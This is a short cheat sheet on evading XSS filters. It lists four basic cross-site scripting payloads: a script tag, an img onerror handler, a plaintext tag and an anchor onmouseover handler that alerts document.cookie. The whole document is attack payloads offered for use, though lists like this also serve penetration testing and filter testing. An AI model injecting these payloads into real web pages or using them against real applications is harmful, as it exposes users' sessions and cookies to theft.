# XSS FILTER EVASION CHEAT SHEET.
## Basic evasion.
```javascript
<script>alert(window.origin)</script>
<img src="" onerror=alert(window.origin)>
<plaintext>alert(window.origin)</plaintext>
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\> 
```
